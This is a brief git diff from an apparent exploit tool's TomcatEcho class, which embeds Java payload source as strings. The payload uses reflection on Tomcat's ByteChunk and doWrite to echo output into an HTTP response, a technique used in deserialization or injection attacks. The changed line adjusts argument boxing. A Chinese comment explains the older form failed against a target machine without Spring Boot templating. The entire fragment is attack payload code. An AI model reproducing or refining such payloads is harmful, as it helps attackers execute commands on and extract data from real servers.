@@ -21,7 +21,7 @@ public class TomcatEcho {
                 "        try {\n" +
                 "            var3 = Class.forName(\"org.apache.tomcat.util.buf.ByteChunk\");\n" +
                 "            var2 = var3.newInstance();\n" +
-                "            var3.getDeclaredMethod(\"setBytes\", new Class[]{byte[].class, int.class, int.class}).invoke(var2, new Object[]{bs, 0, bs.length});\n" +
+                "            var3.getDeclaredMethod(\"setBytes\", new Class[]{byte[].class, int.class, int.class}).invoke(var2, new Object[]{bs, new Integer(0), new Integer(bs.length)});\n" + // 这里一开始换了种写法new Object[]{bs, 0, bs.length}，但是在靶机不启用springboot模板时利用失败了，debug了好久没发现原因，有大佬知道可以提个Issue告诉我(强迫症犯了不搞懂睡不着)
                 "            var0.getClass().getMethod(\"doWrite\", new Class[]{var3}).invoke(var0, new Object[]{var2});\n" +
                 "        } catch (Exception var5) {\n" +
                 "            var3 = Class.forName(\"java.nio.ByteBuffer\");\n" +
